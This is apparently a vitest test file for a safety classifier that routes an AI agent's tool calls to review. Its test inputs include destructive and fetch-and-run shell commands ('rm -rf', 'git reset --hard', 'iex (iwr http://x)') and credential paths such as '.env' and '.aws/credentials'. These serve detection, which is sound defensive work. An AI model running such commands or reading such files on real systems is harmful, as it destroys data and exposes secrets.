/**
 * Modified for dsh-second-look, 2026-10-31 (original work; T02).
 *
 * Action recognition + classification behaviour: the T02 acceptance cases —
 * ordinary reads/writes skip the reviewer, dangerous effects reach review even
 * when renamed or wrapped, sensitive naming only ROUTES (never denies).
 */
import { describe, expect, it } from 'vitest'
import { classifyAction, recognizeCall, shellRiskSignals, containsSensitiveMaterial } from '../src/index.ts'
import type { UnifiedAction, ReviewTier } from '../src/index.ts'

function action(
  toolName: string,
  args: unknown,
  tier: ReviewTier = 'daily',
  targets: UnifiedAction['targets'] = [],
  options?: Parameters<typeof recognizeCall>[2],
): UnifiedAction {
  const recognized = recognizeCall(toolName, args, options)
  return {
    callId: 'call-1',
    isPtcInner: false,
    sessionId: 'session-1',
    origin: 'native',
    toolName,
    arguments: args,
    tier,
    configVersion: 't02-test',
    effect: recognized.effect,
    subOperation: recognized.subOperation,
    targets,
    signals: recognized.signals,
  }
}

/** An in-workspace file target with observed state. */
function insideFile(exists: boolean, sizeBytes?: number): UnifiedAction['targets'] {
  return [{
    rawPath: 'src/a.ts',
    scope: 'inside',
    state: { exists, kind: 'file', ...sizeBytes === undefined ? {} : { sizeBytes } },
  }]
}

describe('action recognition (tool adapters)', () => {
  it('recognizes sub-operations of the edit tool separately', () => {
    expect(recognizeCall('edit', { file_path: 'a', old_string: 'x', new_string: 'y' }).subOperation).toBe('replace')
    expect(recognizeCall('edit', { file_path: 'a', old_string: '', new_string: 'y' }).subOperation).toBe('create')
    expect(recognizeCall('edit', { file_path: 'a', old_string: 'x', new_string: '' }).subOperation).toBe('clear')
    expect(recognizeCall('write', { file_path: 'a', content: '' }).subOperation).toBe('clear')
    expect(recognizeCall('write', { file_path: 'a', content: 'hi' }).subOperation).toBe('create-or-overwrite')
  })

  it('maps execution, delegation and unknown tools to review-worthy effects', () => {
    expect(recognizeCall('pwsh', { command: 'echo hi' }).effect).toBe('execute')
    expect(recognizeCall('run_code', { code: 'x', description: 'd' }).effect).toBe('execute')
    expect(recognizeCall('subagent_fork', { prompt: 'p' }).effect).toBe('delegate')
    expect(recognizeCall('delegate', { library_id: 'lib', prompt: 'p' }).effect).toBe('delegate')
    expect(recognizeCall('delegate', { library_id: 'lib', prompt: 'p' }).subOperation).toBe('delegate')
    expect(recognizeCall('some-future-tool', {}).effect).toBe('unknown')
    expect(recognizeCall('mcp__srv__echo', {}).effect).toBe('unknown')
    expect(recognizeCall('mcp__srv__echo', {}, { verifiedMcpTools: { 'mcp__srv__echo': 'read' } }).effect).toBe('read')
  })

  it('raises shell risk signals for destructive, install and opaque commands', () => {
    expect(shellRiskSignals('git reset --hard')).toContain('destructive-command')
    expect(shellRiskSignals('rm -rf build')).toContain('destructive-command')
    expect(shellRiskSignals('npm install leftpad')).toContain('network-or-install')
    expect(shellRiskSignals('node -e "require(\'fs\')"')).toContain('opaque-execution')
    expect(shellRiskSignals('iex (iwr http://x)')).toContain('opaque-execution')
    expect(shellRiskSignals('echo hello')).toEqual([])
  })
})

describe('classification (T02 acceptance)', () => {
  it('lets ordinary source/doc reads and writes skip the reviewer', () => {
    expect(classifyAction(action('read', { file_path: 'src/a.ts' }, 'daily', insideFile(true))).disposition).toBe('exempt')
    expect(classifyAction(action('grep', { pattern: 'foo', path: 'src' }, 'daily')).disposition).toBe('exempt')
    expect(classifyAction(action('write', { file_path: 'src/a.ts', content: 'x' }, 'daily', insideFile(false))).disposition).toBe('exempt')
    expect(classifyAction(action('edit', { file_path: 'src/a.ts', old_string: 'a', new_string: 'b' }, 'daily', insideFile(true, 1000))).disposition).toBe('exempt')
    expect(classifyAction(action('todo_write', { todos: [] }, 'daily')).disposition).toBe('exempt')
  })

  it('sends dangerous effects to review even when renamed or wrapped', () => {
    expect(classifyAction(action('pwsh', { command: 'rm -rf src' })).disposition).toBe('review')
    expect(classifyAction(action('bash', { command: 'node -e "process.exit()"' })).disposition).toBe('review')
    expect(classifyAction(action('run_code', { code: 'x', description: 'd' })).disposition).toBe('review')
    expect(classifyAction(action('workflow', { script: 'x' })).disposition).toBe('review')
    expect(classifyAction(action('subagent', { prompt: 'x' })).disposition).toBe('review')
    expect(classifyAction(action('some-future-tool', {})).disposition).toBe('review')
    expect(classifyAction(action('mcp__srv__echo', {})).disposition).toBe('review')
    expect(classifyAction(action('job_kill', { job_id: 'j' })).disposition).toBe('review')
  })

  it('detects mass-clear and important replacement through target state', () => {
    // Clearing an existing non-trivial file: review.
    expect(classifyAction(action('write', { file_path: 'src/a.ts', content: '' }, 'daily', insideFile(true, 4096))).disposition).toBe('review')
    // Empty new file is trivial: exempt.
    expect(classifyAction(action('write', { file_path: 'src/b.ts', content: '' }, 'daily', insideFile(false))).disposition).toBe('exempt')
    // Replacing most of an existing file: review.
    const big = classifyAction(action('edit', { file_path: 'src/a.ts', old_string: 'x'.repeat(600), new_string: 'y' }, 'daily', insideFile(true, 1000)))
    expect(big.disposition).toBe('review')
    expect(big.signals).toContain('important-replacement')
  })

  it('routes sensitive naming to review but never denies it', () => {
    const sensitive = classifyAction(action('read', { file_path: '/srv/.env' }, 'daily', insideFile(true)))
    expect(sensitive.disposition).toBe('review')
    expect(sensitive.signals).toContain('sensitive-candidate')
    // The classifier's vocabulary has no 'deny' — routing only.
    expect(sensitive.disposition).not.toBe('deny' as never)
  })

  it('refuses exemption when scope or state is unknown', () => {
    const unknownScope = classifyAction(action('write', { file_path: 'x', content: 'y' }, 'daily', [{ rawPath: 'x', scope: 'unknown' }]))
    expect(unknownScope.disposition).toBe('review')
    const unknownState = classifyAction(action('write', { file_path: 'x', content: 'y' }, 'daily', [{ rawPath: 'x', scope: 'inside' }]))
    expect(unknownState.disposition).toBe('review')
  })

  it('never exempts a write/edit whose targets could not be established (F01)', () => {
    // An empty `targets` array must not pass `every` vacuously.
    const targetlessWrite = classifyAction(action('write', { content: 'malicious' }, 'daily', []))
    expect(targetlessWrite.disposition).toBe('review')
    expect(targetlessWrite.signals).toContain('scope-unknown')
    const targetlessEdit = classifyAction(action('edit', { old_string: 'a', new_string: 'b' }, 'daily', []))
    expect(targetlessEdit.disposition).toBe('review')
  })

  it('reviews network access in BOTH tiers (URL/query is outbound data)', () => {
    // 终审 Major 3: fetch/search send data to external endpoints — an
    // exfiltration channel the llm/stream guard cannot see.
    expect(classifyAction(action('web_search', { query: 'q' }, 'daily')).disposition).toBe('review')
    expect(classifyAction(action('web_search', { query: 'q' }, 'strict')).disposition).toBe('review')
    expect(classifyAction(action('web_fetch', { url: 'http://x' }, 'daily')).disposition).toBe('review')
    expect(classifyAction(action('web_fetch', { url: 'http://x' }, 'strict')).disposition).toBe('review')
  })
})

describe('sensitive detection (routing only)', () => {
  it('detects credential keys, values and store paths structurally', () => {
    expect(containsSensitiveMaterial({ api_key: 'x' })).toBe(true)
    expect(containsSensitiveMaterial({ note: '-----BEGIN PRIVATE KEY-----' })).toBe(true)
    expect(containsSensitiveMaterial({ path: '/home/u/.aws/credentials' })).toBe(true)
    expect(containsSensitiveMaterial({ toolName: 'read', arguments: { file_path: 'src/a.ts' } })).toBe(false)
  })
})
